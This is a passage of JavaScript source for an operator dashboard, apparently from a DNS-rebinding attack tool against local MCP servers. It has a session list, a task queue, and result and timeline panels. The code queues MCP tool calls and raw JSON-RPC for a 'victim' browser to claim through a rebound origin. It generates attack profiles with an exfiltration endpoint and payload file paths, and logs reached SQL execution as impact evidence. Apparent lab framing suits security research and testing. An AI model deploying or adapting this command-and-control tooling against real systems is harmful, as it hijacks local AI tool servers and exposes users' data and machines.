    payload.args = task && task.args ? task.args : payload.args;
  }
  payload.name = task && task.name ? task.name : requestTitle(payload);
  return payload;
}
function requestTitle(req) {
  if (!req) return "Request";
  if (req.name) return req.name;
  if (req.kind === "tools/call") return req.tool || "tools/call";
  if (req.kind === "rpc" && req.rpc && req.rpc.method) return req.rpc.method;
  return req.kind || "Request";
}
function requestDetail(req) {
  if (!req) return "";
  if (req.kind === "tools/call") return req.tool || "tools/call";
  if (req.kind === "rpc" && req.rpc) return req.rpc.method || "raw JSON-RPC";
  return req.kind || "";
}
function requestBody(req) {
  if (!req) return {};
  return req.kind === "rpc" ? (req.rpc || {}) : (req.args || {});
}
function requestAsRpc(req) {
  if (!req) return {};
  if (req.kind === "rpc") return req.rpc || {};
  if (req.kind === "tools/call") return {
    jsonrpc: "2.0",
    id: 1,
    method: "tools/call",
    params: { name: req.tool || "", arguments: req.args || {} },
  };
  return { jsonrpc: "2.0", id: 1, method: req.kind || "tools/list", params: {} };
}
function cleanRequest(req) {
  return {
    kind: req && req.kind ? req.kind : "tools/list",
    tool: req && req.tool ? req.tool : "",
    args: req && req.args ? req.args : {},
    rpc: req && req.rpc ? req.rpc : null,
    name: req && req.name ? req.name : requestTitle(req),
  };
}
function savedRequests() {
  try {
    const raw = JSON.parse(localStorage.getItem(SAVED_REQUESTS_KEY) || "[]");
    return Array.isArray(raw) ? raw : [];
  } catch(e) {
    return [];
  }
}
function writeSavedRequests(items) {
  localStorage.setItem(SAVED_REQUESTS_KEY, JSON.stringify(items.slice(0, 60)));
}
function requestScope(s) {
  return s ? genericTargetName(s) : "Captured MCP";
}
function secureHex(length) {
  const bytes = new Uint8Array(Math.ceil(length / 2));
  crypto.getRandomValues(bytes);
  return Array.from(bytes, byte => byte.toString(16).padStart(2, "0")).join("").slice(0, length);
}
function saveRequest(req, s, source) {
  const clean = cleanRequest(req);
  const scope = requestScope(s);
  const fingerprint = [scope, clean.kind, clean.tool, pretty(requestBody(clean))].join("|");
  const next = savedRequests().filter(item => item.fingerprint !== fingerprint);
  next.unshift({
    id: "r-" + Date.now().toString(36) + "-" + secureHex(6),
    savedAt: new Date().toISOString(),
    scope,
    source: source || "operator",
    fingerprint,
    request: clean,
  });
  writeSavedRequests(next);
  renderSavedRequests(s);
}
function currentEditorRequest() {
  const payload = taskFromEditor();
  if (!payload) return null;
  const task = selectedTask();
  payload.name = task && task.name ? task.name : requestTitle(payload);
  return payload;
}
function matchingTaskIndex(req) {
  const tasks = currentTasks();
  return tasks.findIndex(t => {
    if (!req || (t.kind || "tools/list") !== (req.kind || "tools/list")) return false;
    if ((req.kind || "") === "tools/call") return (t.tool || "") === (req.tool || "");
    return true;
  });
}
function loadRequest(req) {
  if (!req) return;
  if (req.kind === "rpc" && matchingTaskIndex(req) < 0) {
    document.getElementById("rawRpc").value = pretty(req.rpc || {});
    return;
  }
  const idx = matchingTaskIndex(req);
  if (idx < 0) {
    document.getElementById("rawRpc").value = pretty(requestAsRpc(req));
    return;
  }
  if (idx >= 0) {
    activeTaskIndex = idx;
    document.getElementById("toolSelect").value = String(idx);
  }
  const s = selectedSession();
  const task = selectedTask();
  const args = document.getElementById("toolArgs");
  args.value = pretty(requestBody(req));
  args.dataset.operationKey = taskEditorKey(s, task);
  args.dataset.dirty = "1";
  render();
}
async function runRequest(req) {
  if (!req) return;
  await queueTask(cleanRequest(req));
}
function savedRequestById(id) {
  return savedRequests().find(item => item.id === id) || null;
}
async function renameSavedRequest(id, s) {
  const items = savedRequests();
  const item = items.find(x => x.id === id);
  if (!item || !item.request) return;
  const current = requestTitle(item.request);
  const nextName = await showTextDialog({
    title: "Rename saved request",
    body: "Set the label shown in the saved request list.",
    label: "Request name",
    value: current,
    confirmLabel: "Rename",
    cancelLabel: "Cancel"
  });
  if (nextName == null) return;
  const trimmed = nextName.trim();
  if (!trimmed) return;
  item.request.name = trimmed;
  writeSavedRequests(items);
  renderSavedRequests(s);
}
function renderSavedRequests(s) {
  const scope = requestScope(s);
  const items = savedRequests().filter(item => !s || item.scope === scope).slice(0, 8);
  document.getElementById("savedCount").textContent = String(items.length);
  document.getElementById("savedRequests").innerHTML = items.map(item => {
    const req = item.request || {};
    return \`<div class="saved-request">
      <strong>\${esc(requestTitle(req))}</strong>
      <small>\${esc(requestDetail(req))} · \${esc(item.scope || "")}</small>
      <div class="inline-actions">
        <button class="mini ghost" type="button" data-saved-load="\${esc(item.id)}">Load</button>
        <button class="mini" type="button" data-saved-run="\${esc(item.id)}">Run</button>
        <button class="mini ghost" type="button" data-saved-rename="\${esc(item.id)}">Rename</button>
        <button class="mini ghost" type="button" data-saved-delete="\${esc(item.id)}">Delete</button>
      </div>
    </div>\`;
  }).join("") || '<p>No saved requests for this MCP yet.</p>';
  document.querySelectorAll("[data-saved-load]").forEach(btn => btn.onclick = () => {
    const item = savedRequestById(btn.dataset.savedLoad);
    if (item) loadRequest(item.request);
  });
  document.querySelectorAll("[data-saved-run]").forEach(btn => btn.onclick = async () => {
    const item = savedRequestById(btn.dataset.savedRun);
    if (item) await runRequest(item.request);
  });
  document.querySelectorAll("[data-saved-rename]").forEach(btn => btn.onclick = async () => {
    await renameSavedRequest(btn.dataset.savedRename, s);
  });
  document.querySelectorAll("[data-saved-delete]").forEach(btn => btn.onclick = () => {
    writeSavedRequests(savedRequests().filter(item => item.id !== btn.dataset.savedDelete));
    renderSavedRequests(s);
  });
}
function copyText(text) {
  if (navigator.clipboard && window.isSecureContext) return navigator.clipboard.writeText(text);
  const ta = document.createElement("textarea");
  ta.value = text;
  ta.style.position = "fixed";
  ta.style.left = "-1000px";
  document.body.appendChild(ta);
  ta.focus();
  ta.select();
  document.execCommand("copy");
  document.body.removeChild(ta);
  return Promise.resolve();
}
function showTextDialog(options = {}) {
  return new Promise((resolve) => {
    const existing = document.querySelector("#operatorDialogOverlay");
    if (existing) existing.remove();
    const overlay = document.createElement("div");
    overlay.id = "operatorDialogOverlay";
    overlay.className = "operatorDialogOverlay";
    const dialog = document.createElement("section");
    dialog.className = "operatorDialog";
    dialog.setAttribute("role", "dialog");
    dialog.setAttribute("aria-modal", "true");
    dialog.setAttribute("aria-labelledby", "operatorDialogTitle");
    const eyebrow = document.createElement("p");
    eyebrow.className = "operatorDialogEyebrow";
    eyebrow.textContent = "Edit";
    const title = document.createElement("h2");
    title.id = "operatorDialogTitle";
    title.textContent = options.title || "Edit value";
    const body = document.createElement("p");
    body.className = "operatorDialogBody";
    body.textContent = options.body || "";
    const label = document.createElement("label");
    label.textContent = options.label || "Value";
    const input = document.createElement("input");
    input.type = "text";
    input.value = options.value || "";
    const actions = document.createElement("div");
    actions.className = "operatorDialogActions";
    const cancel = document.createElement("button");
    cancel.type = "button";
    cancel.className = "ghost";
    cancel.textContent = options.cancelLabel || "Cancel";
    const confirm = document.createElement("button");
    confirm.type = "button";
    confirm.textContent = options.confirmLabel || "Confirm";
    function finish(value) {
      overlay.remove();
      document.removeEventListener("keydown", onKeydown);
      resolve(value);
    }
    function onKeydown(event) {
      if (event.key === "Escape") finish(null);
      if (event.key === "Enter" && document.activeElement === input) finish(input.value);
    }
    cancel.addEventListener("click", () => finish(null));
    confirm.addEventListener("click", () => finish(input.value));
    overlay.addEventListener("click", (event) => {
      if (event.target === overlay) finish(null);
    });
    document.addEventListener("keydown", onKeydown);
    actions.append(cancel, confirm);
    dialog.append(eyebrow, title, body, label, input, actions);
    overlay.append(dialog);
    document.body.append(overlay);
    input.focus();
    input.select();
  });
}
function renderTask(task, i) {
  const name = task.name || task.kind || ("operation " + (i + 1));
  const detail = task.kind === "tools/call" ? (task.tool || "") : (task.kind || "rpc");
  const cls = i === activeTaskIndex ? "quick-action active" : "quick-action";
  return \`<button class="\${cls}" data-task="\${i}" type="button">
    <span><strong>\${esc(name)}</strong></span>
    <span>\${esc(detail)}</span>
    <small>\${esc(task.kind === "tools/call" ? "MCP tool call" : "MCP request")}</small>
  </button>\`;
}
function taskById(s, id) {
  return sessionTasks(s).find(t => t.id === id) || null;
}
function resultDomKey(item, i) {
  const r = item.result;
  const t = item.task || (r && r.data && r.data.task) || null;
  return [t && t.id ? t.id : "orphan", r && r.receivedAt ? r.receivedAt : item.ts || "", i].join("|");
}
function captureResultScroll(box) {
  const out = { panel: { left: box.scrollLeft, top: box.scrollTop }, blocks: {} };
  box.querySelectorAll("[data-scroll-key]").forEach(el => {
    out.blocks[el.dataset.scrollKey] = { left: el.scrollLeft, top: el.scrollTop };
  });
  return out;
}
function restoreResultScroll(box, saved) {
  if (!saved) return;
  box.scrollLeft = saved.panel.left || 0;
  box.scrollTop = saved.panel.top || 0;
  box.querySelectorAll("[data-scroll-key]").forEach(el => {
    const pos = saved.blocks[el.dataset.scrollKey];
    if (pos) {
      el.scrollLeft = pos.left || 0;
      el.scrollTop = pos.top || 0;
    }
  });
}
function attachResultActions(s) {
  document.querySelectorAll("[data-result-load]").forEach(btn => btn.onclick = () => {
    const t = taskById(s, btn.dataset.resultLoad);
    if (t) loadRequest(requestPayload(t));
  });
  document.querySelectorAll("[data-result-run]").forEach(btn => btn.onclick = async () => {
    const t = taskById(s, btn.dataset.resultRun);
    if (t) await runRequest(requestPayload(t));
  });
  document.querySelectorAll("[data-result-save]").forEach(btn => btn.onclick = () => {
    const t = taskById(s, btn.dataset.resultSave);
    if (t) saveRequest(requestPayload(t), s, "result");
  });
}
function renderResults(s) {
  const tasks = sessionTasks(s);
  const results = sessionResults(s);
  const resultByTask = new Map();
  const orphanResults = [];
  results.forEach(r => {
    const tid = r.data && r.data.task && r.data.task.id;
    if (tid) resultByTask.set(tid, r);
    else orphanResults.push(r);
  });
  const feed = [];
  tasks.forEach(t => {
    const r = resultByTask.get(t.id);
    feed.push({
      ts: (r && r.receivedAt) || t.claimedAt || t.createdAt,
      type: r ? "result" : (t.claimedAt ? "claimed" : "queued"),
      task: t,
      result: r || null,
    });
  });
  orphanResults.forEach(r => feed.push({ ts: r.receivedAt, type: "result", task: null, result: r }));
  const visibleFeed = feed.filter(item => {
    const r = item.result;
    const t = item.task || (r && r.data && r.data.task) || null;
    return !((t && t.kind === "tools/list") || (r && r.stage === "tools/list"));
  });
  const visibleResults = visibleFeed.filter(item => item.result).length;
  visibleFeed.sort((a,b) => String(b.ts || "").localeCompare(String(a.ts || "")));
  const box = document.getElementById("results");
  const scrollState = captureResultScroll(box);
  document.getElementById("resultCount").textContent = visibleResults + (visibleResults === 1 ? " response" : " responses");
  const html = visibleFeed.map((item, i) => {
    const r = item.result;
    const t = item.task || (r && r.data && r.data.task) || null;
    const key = resultDomKey(item, i);
    const title = r ? (r.stage || "MCP response") : (item.type === "claimed" ? "Command claimed" : "Command queued");
    const cls = r && r.stage === "task-error" ? "result-card error" : (r ? "result-card" : "result-card pending");
    const body = r ? {
      request: t,
      response: r.data && r.data.response ? r.data.response : r.data,
      httpStatus: r.data && r.data.status ? r.data.status : null
    } : { request: t, status: item.type === "claimed" ? "claimed by victim, waiting for MCP response" : "queued, waiting for victim poll" };
    const actions = t ? \`<div class="result-actions">
      <button class="mini ghost" type="button" data-result-load="\${esc(t.id || "")}">Load request</button>
      <button class="mini" type="button" data-result-run="\${esc(t.id || "")}">Run again</button>
      <button class="mini ghost" type="button" data-result-save="\${esc(t.id || "")}">Save</button>
    </div>\` : "";
    return \`<div class="\${cls}" data-scroll-key="\${esc(key)}">
      <div class="result-meta"><strong>\${esc(title)}</strong><small>\${esc(item.ts || "")}</small></div>
      <small>\${esc(t ? ((t.kind || "") + (t.tool ? " · " + t.tool : "")) : ((r && r.origin) || ""))}</small>
      <pre data-scroll-key="\${esc(key + ":pre")}">\${esc(pretty(body))}</pre>
      \${actions}
    </div>\`;
  }).join("") || "<p>No non-enumeration commands or MCP responses for this session yet.</p>";
  if (box.innerHTML !== html) box.innerHTML = html;
  restoreResultScroll(box, scrollState);
  attachResultActions(s);
}
function timelineRows(s) {
  if (!s || !state) return [];
  const sid = s.id;
  const rows = [];
  ((state.tasks && state.tasks[sid]) || []).forEach(t => rows.push({
    ts: t.claimedAt || t.createdAt,
    title: t.claimedAt ? "task claimed" : "task queued",
    detail: t,
  }));
  (state.events || []).forEach(e => {
    const p = e.payload || {};
    if (p.session === sid || p.id === sid) {
      rows.push({
        ts: e.ts,
        title: e.kind + (p.phase ? " · " + p.phase : "") + (p.status ? ":" + p.status : ""),
        detail: p,
      });
    }
  });
  (state.results || []).forEach(r => {
    if (r.session === sid) {
      rows.push({
        ts: r.receivedAt,
        title: "result · " + (r.stage || "mcp"),
        detail: r,
      });
    }
  });
  return rows.sort((a,b) => String(b.ts || "").localeCompare(String(a.ts || ""))).slice(0, 80);
}
function sessionResults(s) {
  return ((state && state.results) || []).filter(r => s && r.session === s.id);
}
function sessionEvents(s) {
  return ((state && state.events) || []).filter(e => {
    const p = e.payload || {};
    return s && (p.session === s.id || p.id === s.id);
  });
}
function sessionTasks(s) {
  return s && state && state.tasks ? ((state.tasks[s.id]) || []) : [];
}
function eventSeen(s, phase, status) {
  return sessionEvents(s).some(e => {
    const p = e.payload || {};
    return (!phase || p.phase === phase) && (!status || p.status === status);
  });
}
function findTools(value, out=[]) {
  if (!value) return out;
  if (Array.isArray(value)) {
    value.forEach(v => findTools(v, out));
    return out;
  }
  if (typeof value !== "object") return out;
  if (Array.isArray(value.tools)) {
    value.tools.forEach(t => {
      if (t && typeof t === "object" && t.name) out.push(t);
    });
  }
  Object.values(value).forEach(v => {
    if (v && typeof v === "object") findTools(v, out);
  });
  return out;
}
function discoveredTools(s) {
  const seen = new Set();
  const tools = [];
  sessionResults(s).forEach(r => {
    findTools(r.data).forEach(t => {
      if (!seen.has(t.name)) {
        seen.add(t.name);
        tools.push(t);
      }
    });
  });
  return tools.sort((a,b) => String(a.name).localeCompare(String(b.name)));
}
function schemaArgs(schema) {
  const props = schema && schema.properties && typeof schema.properties === "object" ? schema.properties : {};
  const args = {};
  Object.entries(props).forEach(([name, spec]) => {
    args[name] = defaultArgValue(name, spec || {});
  });
  return args;
}
function defaultArgValue(name, spec) {
  if (spec && Object.prototype.hasOwnProperty.call(spec, "default")) return spec.default;
  const key = String(name || "").toLowerCase();
  const enumValues = Array.isArray(spec && spec.enum) ? spec.enum : [];
  if (key === "query") return "MCP security";
  if (key === "sql") return "SELECT 1";
  if (key.includes("url")) return "http://127.0.0.1/";
  if (key === "country") return enumValues.includes("US") ? "US" : (enumValues[0] || "US");
  if (key === "search_lang") return enumValues.includes("en") ? "en" : (enumValues[0] || "en");
  if (key === "ui_lang") return enumValues.includes("en-US") ? "en-US" : (enumValues[0] || "en-US");
  if (key === "safesearch") return enumValues.includes("moderate") ? "moderate" : (enumValues[0] || "moderate");
  if (key === "count") return 3;
  if (key === "limit") return 10;
  if (key === "offset") return 0;
  const type = spec && spec.type;
  if (type === "number" || type === "integer") return 0;
  if (type === "boolean") return false;
  if (type === "array") return [];
  if (type === "object") return {};
  if (enumValues.length) return enumValues[0];
  return "";
}
function parseOriginPort(origin) {
  try { return Number(new URL(origin).port || 80); } catch(e) { return 0; }
}
function generatedProfile(s) {
  const tools = discoveredTools(s);
  const target = s && s.meta && s.meta.target ? s.meta.target : "captured-mcp";
  const port = parseOriginPort(s && s.origin) || 3000;
  const transport = s && s.transport ? String(s.transport) : "streamable";
  const metaPath = s && s.meta && s.meta.path ? String(s.meta.path) : "";
  const profileTransport = transport === "sse" ? "sse-control" : (transport === "websocket" ? "ws-control" : "streamable-control");
  const profilePath = metaPath || (transport === "sse" ? "/sse" : (transport === "websocket" ? "/" : "/mcp"));
  return {
    name: target.replace(/[^a-z0-9._-]+/gi, "-").toLowerCase() + "-" + port,
    targetName: target,
    transport: profileTransport,
    port,
    path: profilePath,
    wsSubprotocol: transport === "websocket" ? ((s && s.meta && s.meta.subprotocol) || "mcp") : undefined,
    strategy: "fs",
    pollMs: 800,
    maxTries: 40,
    exfil: location.origin + "/c",
    out: "payloads/" + target.replace(/[^a-z0-9._-]+/gi, "-").toLowerCase() + "-" + port + ".html",
    impact: {
      summary: "A rebound browser session can operate this local MCP endpoint.",
      vulnerableCondition: "The MCP endpoint accepts the rebound Host and Origin from the browser.",
      evidenceGoal: "Show tools/list and one target-specific impact operation through the captured browser session."
    },
    tasks: [
      { name: "Enumerate MCP tools", kind: "tools/list" },
      ...tools.map(t => ({
        name: t.name,
        kind: "tools/call",
        tool: t.name,
        args: schemaArgs(t.inputSchema || t.input_schema || {})
      }))
    ]
  };
}
function generatedTasks(s) {
  const profile = s && s.meta && s.meta.profile ? s.meta.profile : {};
  const profileTasks = Array.isArray(profile.tasks) ? profile.tasks : [];
  const out = [];
  const seen = new Set();
  function add(task) {
    if (!task) return;
    const key = (task.kind || "tools/list") + ":" + (task.tool || task.name || "");
    if (seen.has(key)) return;
    seen.add(key);
    out.push(task);
  }
  profileTasks.forEach(add);
  add({ name: "Enumerate MCP tools", kind: "tools/list" });
  discoveredTools(s).forEach(t => add({
    name: t.title || t.name,
    kind: "tools/call",
    tool: t.name,
    args: schemaArgs(t.inputSchema || t.input_schema || {})
  }));
  return out;
}
function genericTargetName(s) {
  const target = s && s.meta && s.meta.target ? String(s.meta.target) : "";
  if (target && !["auto-streamable", "auto-sse", "generic streamable MCP", "generic SSE MCP", "unknown MCP"].includes(target)) return target;
  const port = parseOriginPort(s && s.origin) || "";
  const transport = s && s.transport ? String(s.transport) : "streamable";
  return port ? ("MCP on :" + port + " (" + transport + ")") : "Captured MCP";
}
function renderReadiness(s) {
  const results = sessionResults(s);
  const tools = discoveredTools(s);
  const loaded = !!s || eventSeen(s, "payload", "loaded");
  const initialized = eventSeen(s, "mcp", "initialized") || ["initialized", "polling"].includes(s && s.status) || results.length > 0;
  const listed = tools.length > 0 || results.some(r => r.stage === "tools/list");
  const ready = initialized && listed && !(String((s && s.status) || "").includes("failed"));
  const hasResult = results.length > 0;
  const steps = [
    ["Payload", loaded, loaded ? "loaded" : "waiting"],
    ["DNS Flip", initialized, initialized ? "loopback reached" : "probing"],
    ["MCP Init", initialized, initialized ? "initialized" : "pending"],
    ["Tools", listed, listed ? tools.length + " discovered" : "run tools/list"],
    ["Results", hasResult, hasResult ? results.length + " received" : "none yet"],
  ];
  document.getElementById("readiness").innerHTML = steps.map(([name, done, note], i) => {
    const cls = done ? "ready-step done" : (i === steps.findIndex(x => !x[1]) ? "ready-step active" : "ready-step");
    return \`<div class="\${cls}"><b>\${esc(name)}</b><span>\${esc(note)}</span></div>\`;
  }).join("");
}
function sqlEvidence(s) {
  const rows = [];
  sessionResults(s).forEach(r => {
    const task = r.data && r.data.task;
    const sql = task && task.args && task.args.sql;
    if (task && task.tool === "execute_sql" && sql) rows.push(sql);
  });
  return rows;
}
function renderEvidenceSummary(s) {
  const results = sessionResults(s);
  const tools = discoveredTools(s);
  const tasks = sessionTasks(s);
  const claimed = tasks.filter(t => t.claimedAt).length;
  const sql = sqlEvidence(s);
  const findings = [];
  if (s && s.origin) findings.push("Captured browser session from " + s.origin + ".");
  if (eventSeen(s, "mcp", "initialized") || results.length) findings.push("MCP handshake completed through the rebound browser origin.");
  if (tools.length) findings.push("tools/list exposed " + tools.length + " MCP tool" + (tools.length === 1 ? "" : "s") + ".");
  if (claimed) findings.push("Victim browser claimed " + claimed + " queued operator command" + (claimed === 1 ? "" : "s") + ".");
  if (sql.length) findings.push("execute_sql was reached with " + sql.length + " SQL statement" + (sql.length === 1 ? "" : "s") + ".");
  if (!findings.length) findings.push("No attack artifact yet. Run tools/list, then execute one impact operation.");
  document.getElementById("evidenceState").textContent = results.length ? "confirmed" : "pending";
  document.getElementById("evidenceState").className = results.length ? "status-ok" : "";
  document.getElementById("evidenceSummary").innerHTML = \`
    <div class="summary-grid">
      <div class="summary-card"><b>\${tools.length}</b><span>discovered tools</span></div>
      <div class="summary-card"><b>\${claimed}</b><span>claimed commands</span></div>
      <div class="summary-card"><b>\${results.length}</b><span>MCP responses</span></div>
      <div class="summary-card"><b>\${sql.length}</b><span>SQL statements</span></div>
    </div>
    <ul class="finding-list">\${findings.map(f => \`<li>\${esc(f)}</li>\`).join("")}</ul>\`;
}
function schemaSignature(tool) {
  const schema = tool.inputSchema || tool.input_schema || {};
  const props = schema.properties && typeof schema.properties === "object" ? schema.properties : {};
  const keys = Object.entries(props).map(([k, v]) => k + ":" + ((v && v.type) || "any"));
  return keys.length ? keys.join(", ") : "no declared arguments";
}
function renderToolInventory(s) {
  const tools = discoveredTools(s);
  document.getElementById("toolInventory").innerHTML = tools.map(t => \`<div class="tool-card">
    <strong>\${esc(t.name)}</strong>
    <p>\${esc(t.description || "No description from tools/list.")}</p>
    <code>\${esc(schemaSignature(t))}</code>
  </div>\`).join("") || "<p>No captured tools yet. Run tools/list first.</p>";
  document.getElementById("profileJson").value = pretty(generatedProfile(s));
}
function renderStatus(s) {
  const rows = timelineRows(s);
  const tasks = s && state && state.tasks ? ((state.tasks[s.id]) || []) : [];
  const queued = tasks.filter(t => !t.claimedAt).length;
  const claimed = tasks.filter(t => t.claimedAt).length;
  const done = s && state ? ((state.results || []).filter(r => r.session === s.id).length) : 0;
  const latest = rows[0] || null;
  document.getElementById("mQueued").textContent = queued;
  document.getElementById("mClaimed").textContent = claimed;
  document.getElementById("mDone").textContent = done;
  document.getElementById("mEvents").textContent = rows.length;
  document.getElementById("lastActivity").textContent = latest ? (latest.title + " · " + age(latest.ts)) : "idle";
  document.getElementById("latestEvent").textContent = latest ? pretty(latest.detail) : "";
  const badge = document.getElementById("channelBadge");
  const title = document.getElementById("channelState");
  const hint = document.getElementById("channelHint");
  if (!s) {
    title.textContent = "Waiting for victim";
    hint.textContent = "No captured MCP session is selected.";
    badge.textContent = "offline";
    badge.className = "status-bad";
  } else if (String(s.status || "").includes("failed") || String(s.status || "").includes("error")) {
    title.textContent = "Payload failed to reach MCP";
    hint.textContent = latest ? latest.title : "Check the victim port, payload URL, and target process.";
    badge.textContent = "failed";
    badge.className = "status-bad";
  } else if (s.status === "initialized" || s.status === "polling" || String(s.status || "").startsWith("task:") || done > 0) {
    title.textContent = "MCP captured and controllable";
    hint.textContent = queued ? "A command is queued for the victim browser to claim." : (claimed && !done ? "Command claimed. Waiting for MCP response." : "Select an operation and run it through the victim browser.");
    badge.textContent = "connected";
    badge.className = "status-ok";
  } else {
    title.textContent = "Payload is probing local MCP";
    hint.textContent = latest ? latest.title : "Waiting for DNS rebinding to flip to loopback.";
    badge.textContent = "probing";
    badge.className = "status-ok";
  }
}
function renderTimeline(s) {
  const rows = timelineRows(s);
  document.getElementById("timeline").innerHTML = rows.map(r => \`<div class="row">
    <div class="row-title"><strong>\${esc(r.title)}</strong><small>\${esc(r.ts || "")}</small></div>
    <pre>\${esc(pretty(r.detail))}</pre>
  </div>\`).join("") || "<p>No events for this session.</p>";
}
function taskFromEditor() {
  const task = selectedTask();
  if (!task) return null;
  let body;
  try { body = JSON.parse(document.getElementById("toolArgs").value || "{}"); } catch(e) { alert("Arguments must be valid JSON"); return null; }
  const payload = taskPayload(task);
  if (payload.kind === "rpc") {
    payload.rpc = body;
  } else {
    payload.args = body;
  }
  return payload;
}
function render() {
  const all = sessions();
  const sel = document.getElementById("session");
  const previous = sel.value || requestedSession;
  sel.innerHTML = all.map(s => \`<option value="\${s.id}">\${s.id} · \${genericTargetName(s)} · \${s.status || ""}</option>\`).join("");
  if (previous) sel.value = previous;
  const s = selectedSession();
  if (!s) {
    document.getElementById("targetName").textContent = "Captured MCP";
    document.getElementById("targetSummary").textContent = "No captured session.";
    document.getElementById("taskCards").innerHTML = "<p>No target operations.</p>";
    document.getElementById("toolSelect").innerHTML = "";
    document.getElementById("toolArgs").value = "{}";
    renderSavedRequests(null);
    activeTaskIndex = -1;
    activeSessionId = "";
    renderStatus(null);
    renderReadiness(null);
    renderEvidenceSummary(null);
    renderToolInventory(null);
    renderResults(null);
    renderTimeline(null);
    return;
  }
  requestedSession = s.id;
  const profile = s.meta && s.meta.profile ? s.meta.profile : {};
  document.getElementById("targetName").textContent = genericTargetName(s);
  document.getElementById("targetSummary").textContent = profile.impact && profile.impact.summary ? profile.impact.summary : "Operate the captured MCP through the rebound browser session.";
  document.getElementById("sessionStatus").textContent = s.status || "";
  document.getElementById("sessionStatus").className = String(s.status || "").includes("error") ? "status-bad" : "status-ok";
  document.getElementById("sessionMeta").innerHTML = \`<small>\${esc(s.origin || "")} · \${esc(age(s.lastSeen))}</small><pre>\${esc(pretty(s.meta || {}))}</pre>\`;
  const tasks = currentTasks();
  const toolSelect = document.getElementById("toolSelect");
  const args = document.getElementById("toolArgs");
  const previousIndex = activeSessionId === s.id ? activeTaskIndex : -1;
  activeSessionId = s.id;
  activeTaskIndex = previousIndex >= 0 && previousIndex < tasks.length ? previousIndex : (tasks.length ? 0 : -1);
  toolSelect.innerHTML = tasks.map((t, i) => \`<option value="\${i}">\${esc(t.name || t.tool || t.kind || ("operation " + (i + 1)))}</option>\`).join("");
  if (activeTaskIndex >= 0) toolSelect.value = String(activeTaskIndex);
  const editorKey = taskEditorKey(s, tasks[activeTaskIndex]);
  if (args.dataset.operationKey !== editorKey) {
    loadTaskIntoEditor(tasks[activeTaskIndex]);
    args.dataset.operationKey = editorKey;
    args.dataset.dirty = "";
  }
  document.getElementById("taskCards").innerHTML = tasks.map(renderTask).join("") || "<p>No operations yet. Run tools/list first.</p>";
  document.querySelectorAll("[data-task]").forEach(btn => {
    btn.onclick = async () => {
      activeTaskIndex = Number(btn.dataset.task);
      document.getElementById("toolSelect").value = String(activeTaskIndex);
      loadTaskIntoEditor(tasks[activeTaskIndex]);
      document.getElementById("toolArgs").dataset.operationKey = taskEditorKey(s, tasks[activeTaskIndex]);
      document.getElementById("toolArgs").dataset.dirty = "";
      render();
    };
  });
  renderStatus(s);
  renderReadiness(s);
  renderEvidenceSummary(s);
  renderToolInventory(s);
  renderSavedRequests(s);
  renderResults(s);
  renderTimeline(s);
}
async function refresh() {
  try {
    state = await api("/api/state");
    document.getElementById("conn").textContent = "online";
    document.getElementById("conn").className = "status-ok";
    render();
  } catch(e) {
    document.getElementById("conn").textContent = tokenRequired ? "auth required" : "error";
    document.getElementById("conn").className = "status-bad";
  }
}
document.getElementById("saveToken").onclick = () => {
  token = document.getElementById("token").value.trim();
  localStorage.setItem("mcpRebindToken", token);
  showTokenSavedHint(document.getElementById("saveToken"), "Token saved");
  refresh();
};
document.getElementById("session").onchange = () => { requestedSession = document.getElementById("session").value; render(); };
document.getElementById("refresh").onclick = refresh;
document.getElementById("toolSelect").onchange = () => {
  activeTaskIndex = Number(document.getElementById("toolSelect").value || 0);
  loadTaskIntoEditor(selectedTask());
  document.getElementById("toolArgs").dataset.operationKey = taskEditorKey(selectedSession(), selectedTask());
  document.getElementById("toolArgs").dataset.dirty = "";
  render();
};
document.getElementById("toolArgs").oninput = () => { document.getElementById("toolArgs").dataset.dirty = "1"; };
document.getElementById("saveCurrent").onclick = () => {
  const payload = currentEditorRequest();
  if (!payload) return;
  saveRequest(payload, selectedSession(), "editor");
};
document.getElementById("runSelected").onclick = async () => {
  const payload = taskFromEditor();
  if (!payload) return;
  const btn = document.getElementById("runSelected");
  const old = btn.textContent;
  btn.textContent = "Queued";
  await queueTask(payload);
  setTimeout(() => btn.textContent = old, 1000);
};
document.getElementById("runRaw").onclick = async () => {
  let rpc;
  try { rpc = JSON.parse(document.getElementById("rawRpc").value || "{}"); } catch(e) { alert("Raw RPC must be JSON"); return; }
  await queueTask({ kind: "rpc", rpc });
};
document.getElementById("copyProfile").onclick = async () => {
  await copyText(document.getElementById("profileJson").value || "{}");
  const btn = document.getElementById("copyProfile");
  const old = btn.textContent;
  btn.textContent = "Copied";
  setTimeout(() => btn.textContent = old, 1000);
};
document.getElementById("refreshProfile").onclick = async () => {
  const s = selectedSession();
  if (s && discoveredTools(s).length === 0) {
    await queueTask({ kind: "tools/list" });
  } else {
    renderToolInventory(s);
  }
};
refresh();
setInterval(refresh, 2000);
${SNAP_BACK_INTERACTION_SCRIPT}
attachServerSnapBackInteractions();
</script>
</body>
</html>`;
}
function labConfig() {
  return {
    mode: "remote-http",
    service: "mcp_binder-dashboard",
    domain: options.rebindDomain,
    rebindDomain: options.rebindDomain,
    operatorIp: options.publicIp,
    publicIp: options.publicIp,
    dashboardFqdn: options.dashboardFqdn,
    defaultTargetIp: options.defaultTargetIp,
    defaultTargetPort: options.defaultTargetPort,
    defaultPayloadPath: options.defaultPayloadPath,
    defaultStrategy: options.defaultStrategy,
    launcherPort: options.launcherPort
  };
}

function firstPort(value) {
  const raw = String(value || "").split(",")[0].trim();
  if (!raw) {
    return "";
  }
  return raw.includes("-") ? raw.split("-")[0].trim() : raw;
}

function escapeHtml(value) {
  return String(value ?? "").replace(/[&<>"']/g, (char) => ({
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#39;"
  }[char]));
}

function escapeScript(value) {
  return String(value ?? "").replace(/\\/g, "\\\\").replace(/"/g, '\\"').replace(/\n/g, "\\n");
}

function setCorsHeaders(res) {
  res.setHeader("access-control-allow-origin", "*");
  res.setHeader("access-control-allow-methods", "GET,POST,OPTIONS");
  res.setHeader("access-control-allow-headers", "content-type,authorization,x-mcp-binder-ingest-token");
}

function getOption(argv, option) {
  const index = argv.indexOf(option);
  if (index === -1) {
    return undefined;
  }
  return argv[index + 1];
}

function requiredId(value, message) {
  const id = String(value || "").trim();
  if (!id) {
    throw new Error(message);
  }
  return id;
}

function unique(values) {
  return [...new Set(values.filter((value) => value !== undefined && value !== null && value !== ""))];
}

function clone(value) {
  return JSON.parse(JSON.stringify(value));
}
